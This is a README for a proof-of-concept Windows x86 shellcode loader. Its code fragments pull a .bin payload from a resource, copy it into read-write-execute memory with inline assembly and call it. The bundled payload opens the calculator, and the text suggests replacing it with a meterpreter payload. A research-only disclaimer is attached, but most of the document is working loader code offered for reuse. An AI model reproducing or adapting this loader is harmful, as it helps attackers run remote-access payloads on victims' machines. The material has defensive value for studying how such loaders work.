# Create_Thread: Inline_Assembly_x86
This POC provides the ability to execute **x86 shellcode in the form of a .bin file** based on x86 inline assembly.
The POC includes a calc.bin, which executes the Windows x86 calculator and can be replaced for example by a **x86 meterpreter.bin payload**.

# **Disclaimer**
The content and all code examples in this article are for research purposes only and must not be used in an unethical context! The code used is not new and I make no claim to it. Most of the code comes, as so often, from the **ired.team, thank you @spotheplanet for your brilliant work and sharing it with us all!**

# **Description**
This code part initializes a handle (HRSRC) to a binary resource in the executable file. The FindResource() function locates the resource based on its name (IDR_CALC_BIN1) and type (CALC_BIN). The NULL parameter specifies the module instance handle, which is not needed in this case since the resource is located in the same executable file.
``` HRSRC codeResource;
    codeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC_BIN1), L"CALC_BIN");
```

These lines determine the size of the resource data in bytes, load the resource data into memory, and lock the data in place so that it can be accessed by the program.
``` DWORD codeSize;
    codeSize = SizeofResource(NULL, codeResource);
    HGLOBAL codeResourceData;
    codeResourceData = LoadResource(NULL, codeResource);
    void* codeData;
    codeData = LockResource(codeResourceData);
```

This code part allocates a region of memory that is both committed and reserved with the PAGE_EXECUTE_READWRITE protection flag. This means that the memory is both readable and writable, but also executable. The VirtualAlloc() function is used to allocate a block of memory, and the NULL parameter specifies that the block should be allocated in the process's default address space.
``` void* exec;
    exec = VirtualAlloc(NULL, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

This code part uses assembly language to copy the resource data to the executable memory. The mov instruction moves data from one register to another, and rep movsb copies data from the source address to the destination address.
```    
    __asm {
        mov esi, codeData;
        mov edi, exec;
        mov ecx, codeSize;
        cld;
        rep movsb;
    }
```

This code part uses assembly language to execute the code in the newly allocated memory. The mov instruction loads the address of the executable memory into the EBX register, and call ebx calls the code at that address.
```    
    __asm {
        mov ebx, exec;
        call ebx;
    }
```

This code part frees the executable memory that was allocated earlier using the VirtualFree() function with the MEM_RELEASE flag. The 0 parameter specifies the size of the memory region to free, and return 0 ends the program.
```    
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
```
